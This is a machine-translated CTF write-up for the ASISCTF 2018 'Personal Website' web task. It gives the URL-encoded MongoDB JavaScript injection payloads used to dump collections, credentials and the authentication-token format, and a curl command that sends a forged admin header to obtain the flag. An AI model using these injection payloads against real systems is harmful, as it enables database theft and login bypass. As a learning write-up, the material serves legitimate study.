<html>
<head>
<title>MongoDB Injection — ASISCTF 2018 Quals — Personal Website Write-Up (WEB Task)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">MongoDB注入— ASISCTF 2018 Quals —个人网站写(WEB任务)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/mongodb-injection-asisctf-2018-quals-personal-website-write-up-web-task-115be1344ea2?source=collection_archive---------1-----------------------#2018-04-30">https://infosecwriteups.com/mongodb-injection-asisctf-2018-quals-personal-website-write-up-web-task-115be1344ea2?source=collection_archive---------1-----------------------#2018-04-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="cc34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参与者被问了以下问题。</p><blockquote class="kl km kn"><p id="b4da" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">描述:</p><p id="0c27" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">我很高兴，因为我建立了新的个人网站。很安全，不是吗？</p></blockquote><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div class="gh gi kt"><img src="../Images/0c5b0ba395781ba6e9f035dcf1d5f0b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:826/format:webp/1*yB8AVO2xadCGmsyTtx0sag.png"/></div></figure><p id="044f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在侦察阶段之后，我们到达了一些终点:</p><pre class="ku kv kw kx gt lb lc ld le aw lf bi"><span id="3160" class="lg lh iq lc b gy li lj l lk ll">/admin_area<br/>/get/image/[id]<br/>/get/text/[id]<br/>/get/image/[id]</span></pre><p id="5621" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在<code class="fe lm ln lo lc b">/get/image/[id]</code>上Fuzzing，我们发现它在引用注入后返回错误:</p><pre class="ku kv kw kx gt lb lc ld le aw lf bi"><span id="2b93" class="lg lh iq lc b gy li lj l lk ll"><strong class="lc ir">Application-Error: </strong>exception: SyntaxError: Unexpected token ILLEGAL</span></pre><p id="5677" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大约花了2个小时，我们到达了一个没有错误的状态，查询如下:</p><pre class="ku kv kw kx gt lb lc ld le aw lf bi"><span id="d35d" class="lg lh iq lc b gy li lj l lk ll">1%7D);return%7B1:1%7D%7D%2f%2f</span></pre><p id="3443" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">导致了:</p><pre class="ku kv kw kx gt lb lc ld le aw lf bi"><span id="bba8" class="lg lh iq lc b gy li lj l lk ll">Couln't find "picture_path" property in returning object from database.</span></pre><p id="1d6f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">事后:</p><pre class="ku kv kw kx gt lb lc ld le aw lf bi"><span id="4843" class="lg lh iq lc b gy li lj l lk ll">1%7D);return%7Bpicture_path:'Injected'%7D%7D%2f%2f</span></pre><p id="4535" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后提取数据。现在一堆问题:</p><pre class="ku kv kw kx gt lb lc ld le aw lf bi"><span id="0b15" class="lg lh iq lc b gy li lj l lk ll">1%7D);return%7Bpicture_path:tojson(db.getCollectionNames()),something:2%7D%7D%2f%2f<br/>1%7D);return%7Bpicture_path:tojson(db.authentication.find()[1]),something:2%7D%7D%2f%2f<br/>1%7D);return%7Bpicture_path:tojson(db.credentials.find()[0]),something:2%7D%7D%2f%2f</span></pre><p id="5256" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">揭示了2个重要数据:</p><pre class="ku kv kw kx gt lb lc ld le aw lf bi"><span id="b522" class="lg lh iq lc b gy li lj l lk ll">{<br/>	"_id" : ObjectId("5ae63ae0a86f623c83fecfb4"),<br/>	"id" : 2,<br/>	"method" : "header",<br/>	"format" : "md5(se3cr3t|[username]|[password])",<br/>	"activate" : "true"<br/>}</span><span id="498f" class="lg lh iq lc b gy lp lj l lk ll">{<br/>	"_id" : ObjectId("5ae63ae0a86f623c83fecfb1"),<br/>	"id" : 1,<br/>	"username" : "administrator",<br/>	"password" : "H4rdP@ssw0rd?"<br/>}</span></pre><p id="0e74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以<code class="fe lm ln lo lc b">md5('se3cr3t'|administrator|h4rdP@ssw0rd?)</code>需要通过header方法登录，但是等等，header name是什么？<code class="fe lm ln lo lc b">/admin_area</code>访问透露:</p><pre class="ku kv kw kx gt lb lc ld le aw lf bi"><span id="9bb0" class="lg lh iq lc b gy li lj l lk ll">authorization_token not found</span></pre><p id="15a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后:</p><pre class="ku kv kw kx gt lb lc ld le aw lf bi"><span id="c2f3" class="lg lh iq lc b gy li lj l lk ll">curl <a class="ae ks" href="http://206.189.54.119:5000/admin_area" rel="noopener ugc nofollow" target="_blank">http://206.189.54.119:5000/admin_area</a> -H "authorization_token: 2cc348195dc1ab9842f9446b41ef650b"<br/>ASIS{3c266f6ccdaaef52eb4a9ab3abc2ca70}</span></pre></div></div>    
</body>
</html>